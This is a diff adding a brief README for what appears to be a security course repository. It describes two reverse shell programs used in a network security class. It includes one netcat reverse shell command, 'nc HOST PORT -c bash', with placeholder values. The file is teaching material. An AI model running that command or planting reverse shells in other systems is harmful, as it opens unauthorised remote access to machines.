@@ -1,0 +1,5 @@
+These are reverse shells used in SecureSet's Net Security 200 class (Classes go from 100 - 600).
+
+Rev.c is a shell that goes through the same steps as netcat nc HOST PORT -c bash
+
+rshell.c is the x86 assembly code provided by metasploit that performs the same actions, shown as an example of a metasploit payload.
